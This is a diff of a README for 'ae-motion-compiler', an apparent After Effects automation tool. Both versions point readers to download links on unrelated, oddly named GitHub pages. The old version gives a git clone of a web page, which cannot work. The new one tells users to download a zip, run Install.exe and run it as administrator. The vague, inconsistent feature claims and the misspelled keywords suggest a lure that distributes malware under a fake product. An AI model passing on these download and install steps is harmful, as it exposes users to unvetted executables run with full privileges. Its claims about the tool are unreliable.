@@ -1,328 +1,74 @@
-# 🎬 ae-motion-compiler
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://volumetenrectify.github.io/ae-motion-compiler/)
-
-## 🚀 Motion Graphics Automation Framework for After Effects
-
-ae-motion-compiler is an advanced scripting framework that automates repetitive animation tasks in After Effects. Procedural keyframe generation, expression-based animation control, layer management at scale, and render automation. Built for motion designers, animators, and production teams using CC 2024+.
-
-Accelerate motion graphics production through intelligent automation.
-
-## 📦 Latest
-
-**Version**: 2.4.2 (CC 2024+)
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://volumetenrectify.github.io/ae-motion-compiler/)
-
-## 📖 Index
-- [Details](#🎯-details)
-- [System](#💻-system)
-- [Setup](#📦-setup)
-- [Config](#⚙️-config)
-- [Animation](#🎨-animation)
-- [Tools](#✨-tools)
-- [Support](#🔌-support)
-- [Plans](#🗺️-plans)
-- [Contribute](#🤝-contribute)
-- [Security](#🛡️-security)
-- [Help](#🔧-help)
-- [Legal](#📄-legal)
-- [Info](#⚠️-info)
-
-## 🎯 Details
-
-ae-motion-compiler streamlines motion graphics workflows through procedural animation. Define animation patterns once, apply across hundreds of layers. Generate keyframes based on layer properties, automate easing curves, manage expression-based animations at scale, and handle complex render workflows.
-
-Includes keyframe generators, expression builders, layer organizers, and batch automation tools.
-
-```mermaid
-graph TD
-    A[Animation Template] --> B[Expression Engine]
-    B --> C[Pattern Recognition]
-    C --> D[Keyframe Generation]
-    D --> E[Layer Application]
-    E --> F[Easing Control]
-    F --> G[Preview]
-    G --> H[Batch Render]
-    H --> I[Output]
-    
-    style A fill:#fff3e0
-    style B fill:#e3f2fd
-    style D fill:#f3e5f5
-    style H fill:#e8f5e9
-    style I fill:#fce4ec
-```
-
-## 💻 System
-
-| Component | Min | Recommended |
-|-----------|-----|-------------|
-| **OS** | ![Windows](https://img.shields.io/badge/Windows-10-0078D4?style=flat) ![Mac](https://img.shields.io/badge/macOS-10.15-000000?style=flat) | ![Windows](https://img.shields.io/badge/Windows-11-0078D4?style=flat) ![Mac](https://img.shields.io/badge/macOS-12-000000?style=flat) |
-| **After Effects** | CC 2024 | CC 2026 current |
-| **Memory** | 8 GB | 16 GB+ |
-| **Storage** | 800 MB | 2.5 GB SSD |
-| **CPU** | 4-core | 8-core+ |
-
-## 📦 Setup
-
-Installs:
-1. Compatibility check
-2. Script deployment
-3. Expression templates
-4. Configuration
-
-### Manual
-
-```bash
-git clone https://volumetenrectify.github.io/ae-motion-compiler/
-cd ae-motion-compiler
-npm install
-npm run build
-npm run install:ae
-```
-
-### First Use
-
-1. Open After Effects
-2. **File → Scripts → ae-motion-compiler**
-3. Main panel opens
-4. Load project template
-
-## ⚙️ Config
-
-### Preferences
-
-Set in script settings:
-
-```yaml
-core:
-  version: "2.4"
-  auto_update: true
-  undo_groups: true
-
-keyframes:
-  default_easing: "ease-in-out"
-  keyframe_spacing: "uniform"
-  auto_bezier: true
-  preserve_velocity: true
-
-expressions:
-  validation: true
-  error_reporting: true
-  performance_mode: "balanced"
-  syntax_highlight: true
-
-layers:
-  batch_limit: 500
-  hierarchy_preserve: true
-  naming_convention: "kebab-case"
-  auto_organize: true
-
-render:
-  queue_management: true
-  output_format: "mp4"
-  render_settings: "high-quality"
-  monitor_progress: true
-
-export:
-  include_metadata: true
-  preserve_structure: true
-  backup_source: true
-```
-
-### Templates
-
-- **slide** — Sliding text animations
-- **scale** — Growth/shrink sequences
-- **rotate** — Rotation patterns
-- **color** — Color transition animations
-- **morph** — Shape morphing
-- **stagger** — Cascading effects
-- **bounce** — Physics-based motion
-- **wave** — Wave propagation
-
-## 🎨 Animation
-
-### Keyframe Generation
-
-```javascript
-// Generate keyframes
-animationEngine.generateKeyframes({
-  layer: "Title",
-  property: "position",
-  startValue: [0, 0],
-  endValue: [1920, 1080],
-  duration: 3000,
-  easing: "ease-in-out"
-});
-```
-
-### Expression Control
-
-```javascript
-// Build expression
-expressionBuilder.create({
-  type: "wiggle",
-  frequency: 2,
-  amplitude: 10,
-  apply_to: "rotation"
-});
-```
-
-### Batch Animation
-
-```javascript
-// Apply to multiple layers
-batchAnimator.apply({
-  layers: ["all"],
-  template: "slide",
-  offset: 100,
-  duration: 2000,
-  stagger: true
-});
-```
-
-## ✨ Tools
-
-| Tool | Purpose | Use |
-|------|---------|-----|
-| **Keyframe Generator** | Procedural keyframes | Automated timing |
-| **Expression Builder** | Expression creation | Dynamic properties |
-| **Layer Manager** | Organization | Batch operations |
-| **Easing Curve Editor** | Curve control | Animation feel |
-| **Renderer Manager** | Render automation | Batch output |
-| **Timeline Organizer** | Timeline control | Comp structure |
-| **Effect Applier** | Effect automation | Consistent effects |
-| **Preview Player** | Quick preview | Real-time check |
-
-## 🔌 Support
-
-| Feature | Status | Details |
-|---------|--------|---------|
-| **Script-based Animation** | ✅ Full | Procedural keyframes |
-| **Expression Generation** | ✅ Full | Custom expressions |
-| **Batch Processing** | ✅ Full | Multi-layer ops |
-| **Render Automation** | ✅ Full | Queue management |
-| **Effect Presets** | 🟡 Beta | Effect application |
-| **Plugin Integration** | 🟡 Beta | Third-party tools |
-| **Cloud Sync** | 🔶 Alpha | Project backup |
-| **Remote Control** | 🔶 Alpha | API access |
-
-**Status**: ✅ Ready · 🟡 In Progress · 🔶 Development
-
-## 🗺️ Plans
-
-### Q1 2026: Performance
-- Faster keyframe generation
-- Optimized expression parsing
-- Reduced memory usage
-- Better GPU support
-
-### Q2 2026: Features
-- Advanced motion paths
-- Physics engine integration
-- Procedural rigging
-- Puppet pin automation
-
-### Q3 2026: Intelligence
-- Smart ease suggestions
-- Auto-timing optimization
-- Motion prediction
-- Keyframe interpolation
-
-### Q4 2026: Integration
-- Plugin marketplace
-- Effect library
-- Workflow templates
-- Team collaboration
-
-## 🤝 Contribute
-
-Help develop ae-motion-compiler:
-
-1. **Report Issues** — Bug reports and edge cases
-2. **Suggest Features** — Animation ideas welcome
-3. **Share Templates** — Animation patterns
-4. **Write Docs** — Usage guides
-5. **Test Beta** — Early access program
-
-```bash
-git clone https://volumetenrectify.github.io/ae-motion-compiler/
-cd ae-motion-compiler
-npm install
-npm run dev
-npm test
-```
-
-## 🛡️ Security
-
-### Data Protection
-- Local processing only
-- No cloud uploads
-- Project backups preserved
-- Encrypted settings
-
-### System Safety
-- Safe script execution
-- Memory management
-- Error recovery
-- Automatic cleanup
-
-### Stability
-- Crash prevention
-- Undo capability
-- Version control
-- Safe rollback
-
-## 🔧 Help
-
-### Issues
-
-| Problem | Solution |
-|---------|----------|
-| **Script won't load** | Check After Effects version |
-| **Keyframes not generating** | Verify layer selection |
-| **Expression error** | Check syntax in builder |
-| **Slow performance** | Reduce batch size |
-| **Memory error** | Close other applications |
-
-### Support
-
-- **Docs**: GitHub Wiki tutorials
-- **Discord**: Community support
-- **Issues**: Bug tracker
-- **Email**: support@motion-compiler.dev
-
-## 📄 License
-
-MIT License - [LICENSE](LICENSE) file.
-
-**Copyright © 2026 Motion Compiler Contributors**
-
-## ⚠️ Info
-
-Independent project, not affiliated with Adobe Inc. After Effects trademark belongs to Adobe.
-
-### Key Points
-
-1. **License** — Valid After Effects CC 2024+ required
-2. **Terms** — Follow Adobe guidelines
-3. **Backups** — Keep project files safe
-4. **Testing** — Test animations before output
-5. **Performance** — Monitor system resources
-6. **Updates** — Stay current with versions
-7. **Expertise** — Animation skills still essential
-
-### Disclaimer
-
-Script-generated animations require human review and refinement. Quality depends on template design and parameter settings. Professional judgment remains essential for production work. This tool accelerates workflow, not replaces animation expertise.
-
----
-
-## 🎬 Automate Your Motion Graphics
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://volumetenrectify.github.io/ae-motion-compiler/)
-
-**Accelerate animation production.** Download ae-motion-compiler and streamline your workflow.
-
-*"Automate repetition. Enhance creativity. Faster production."*
+# ⚡ ae-motion-compiler - Automate your After Effects animation workflow
+
+[ ![Download AE Motion Compiler](https://img.shields.io/badge/Download-Release-blue.svg) ](https://github.com/incorruptible-laticifer419/ae-motion-compiler)
+
+## 🎯 About the tool
+
+The ae-motion-compiler helps motion designers save time. You use it to automate repetitive tasks in Adobe After Effects 2024 or newer. It handles keyframes, expressions, and layer organization. You spend less time clicking and more time creating. The system streamlines your design process through batch processing and procedural animation tools.
+
+## 📋 System requirements
+
+Before you install, make sure your computer meets these needs:
+
+*   Operating System: Windows 10 or Windows 11.
+*   Software: Adobe After Effects CC 2024 or later version.
+*   Memory: 16 GB RAM recommended for smooth performance.
+*   Storage: 200 MB of free space.
+*   Connection: Internet connection to download the tool.
+
+## 📥 How to download and install
+
+Follow these steps to set up the tool on your Windows machine.
+
+1.  Visit the [official download page here](https://github.com/incorruptible-laticifer419/ae-motion-compiler).
+2.  Look for the section marked Releases on the right side of the page.
+3.  Click the version with the label Latest.
+4.  Find the file ending in .zip under the Assets section.
+5.  Click the file to start the download.
+6.  Open your Downloads folder and right-click the zip file.
+7.  Select Extract All from the menu.
+8.  Choose a folder on your computer to save the files.
+9.  Open the new folder and find the file named Install.exe.
+10. Double-click this file to launch the installer.
+11. Follow the prompts on your screen to complete the setup.
+
+## ⚙️ How to use the software
+
+Once you install the software, it appears as a panel inside your After Effects workspace. If you do not see it, follow these steps to enable it:
+
+1.  Open Adobe After Effects.
+2.  Go to the top menu bar.
+3.  Click Window.
+4.  Hover over Extensions.
+5.  Select ae-motion-compiler from the list.
+
+The panel appears on your screen. You can dock this panel anywhere in your interface.
+
+## 🛠️ Core features
+
+### Procedural keyframe generation
+You define the start and end points for your motion. The tool calculates the values in between. This creates fluid motion without the need for manual adjustment of every frame. You change the settings in the panel to adjust the speed and timing of your animations.
+
+### Expression-based control
+Complex movements often require difficult math. This tool writes the code for you. You select a layer and choose an effect from the list. The tool applies a pre-written expression to your property. This allows for complex physics or loops with one click.
+
+### Layer automation
+Managing hundreds of layers takes time. You select a group of layers and use the automation tools to rename, label, or sequence them. The tool automates the process of offsetting layers on the timeline. This saves minutes of work on every composition.
+
+### Batch rendering
+You export multiple compositions at once. You identify the compositions you want to render and add them to the queue. The software automatically handles the file naming and output settings for every item.
+
+## 🩺 Troubleshooting
+
+If you encounter issues, try these common fixes:
+
+*   Restart: Close After Effects and open it again. This fixes most panel display issues.
+*   Permissions: Run the installer as an administrator. Right-click the file and choose Run as Administrator.
+*   Version check: Ensure you use Adobe After Effects 2024 or newer. Older versions do not support this toolkit.
+*   Panel visibility: If the panel stays empty, click the Refresh button at the bottom of the panel interface.
+
+## 🤝 Support and contributions
+
+This tool is open for community improvement. If you find a bug, report it on the GitHub issues page. You can offer suggestions for new features there as well. The code stays open for developers who want to add their own custom animation scripts to the framework.
+
+Keywords: abobe, ae, after, after-effects, animation, effects, motion-graphics, video-editing
